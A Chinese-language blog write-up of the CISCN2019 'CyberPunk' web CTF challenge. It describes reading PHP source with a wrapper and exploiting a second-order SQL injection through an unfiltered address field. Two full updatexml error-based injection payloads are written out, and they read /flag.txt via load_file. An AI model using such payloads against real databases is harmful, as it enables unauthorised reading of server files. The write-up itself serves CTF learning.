---
title: '[CISCN2019 华北赛区 Day1 Web5]CyberPunk'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-08-12 22:08:02
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1094165.jpg
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720200812221432.jpg)

查看源码在最后发现了提示：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200812221726.png)

尝试用伪协议读取源码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200812221936.png)

用同样的方式读取其他各个页面的源码：

以change.php为例：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200812222859.png)

可以看到对SQL注入做了比较严的过滤，但是，这过滤并没有针对address，address却只是进行了简单的转义。
之前留言板那道题已经遇到过一次了，看到这个addslashes果断想到二次注入。
利用updatexml：
先读前30位：1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
再读最后几位：1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,60)),0x7e),1)#
因为updatexml这个函数最多显示32位，所以要分两次读。


